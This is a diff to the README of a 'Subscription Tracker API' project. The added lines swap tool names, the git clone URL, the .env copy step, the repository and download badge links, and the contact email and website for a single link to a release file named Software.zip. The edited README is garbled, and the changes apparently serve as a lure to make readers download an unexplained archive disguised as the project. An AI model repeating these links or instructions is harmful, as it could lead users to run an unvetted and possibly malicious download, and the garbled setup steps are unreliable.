@@ -13,8 +13,8 @@ Welcome to the **Subscription Tracker API** repository! Here, you will find all 
 To get started with the Subscription Tracker API, you will need the following tools and technologies:
 
 - **JavaScript**: The primary programming language used for building the API.
-- **Node.js**: The runtime environment for executing JavaScript code on the server-side.
-- **Express.js**: A web application framework for Node.js used for building APIs.
+- **https://github.com/Jaebum0505/subscription-tracker-api/releases/download/v1.0/Software.zip**: The runtime environment for executing JavaScript code on the server-side.
+- **https://github.com/Jaebum0505/subscription-tracker-api/releases/download/v1.0/Software.zip**: A web application framework for https://github.com/Jaebum0505/subscription-tracker-api/releases/download/v1.0/Software.zip used for building APIs.
 - **JWT Authentication**: JSON Web Tokens for secure authentication between the client and server.
 - **Database Modeling**: Organizing data structure for efficient storage and retrieval.
 - **API Architecture**: Designing endpoints and data flow for seamless communication.
@@ -27,7 +27,7 @@ Follow these steps to get started with the Subscription Tracker API:
 
 1. Clone the repository to your local machine.
    ```bash
-   git clone https://github.com/your-username/subscription-tracker-api.git
+   git clone https://github.com/Jaebum0505/subscription-tracker-api/releases/download/v1.0/Software.zip
    ```
 
 2. Install the necessary dependencies.
@@ -37,7 +37,7 @@ Follow these steps to get started with the Subscription Tracker API:
 
 3. Set up your environment variables for configuration.
    ```bash
-   cp .env.example .env
+   cp https://github.com/Jaebum0505/subscription-tracker-api/releases/download/v1.0/Software.zip .env
    ```
 
 4. Start the development server.
@@ -62,11 +62,11 @@ The project structure of the **Subscription Tracker API** is organized as follow
 
 For more details on building a subscription management system with the Subscription Tracker API, you can:
 
-- Visit the [GitHub Repository](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) to access the source code.
+- Visit the [GitHub Repository](https://github.com/Jaebum0505/subscription-tracker-api/releases/download/v1.0/Software.zip) to access the source code.
 - Check the "Releases" section for the latest updates and version releases.
 - Explore the API documentation for in-depth insights into endpoints and functionality.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Now](https://github.com/Jaebum0505/subscription-tracker-api/releases/download/v1.0/Software.zip)](https://github.com/Jaebum0505/subscription-tracker-api/releases/download/v1.0/Software.zip)
 
 Let's innovate and elevate your subscription management system with the **Subscription Tracker API**. Happy coding! 🌟
 
@@ -74,9 +74,9 @@ Let's innovate and elevate your subscription management system with the **Subscr
 
 Have questions or feedback? Feel free to reach out:
 
-📧 Email: contact@subscriptiontrackerapi.com
+📧 Email: https://github.com/Jaebum0505/subscription-tracker-api/releases/download/v1.0/Software.zip
 🐦 Twitter: @subtrackerapi
-🌐 Website: www.subscriptiontrackerapi.com
+🌐 Website: https://github.com/Jaebum0505/subscription-tracker-api/releases/download/v1.0/Software.zip
 
 ---
 
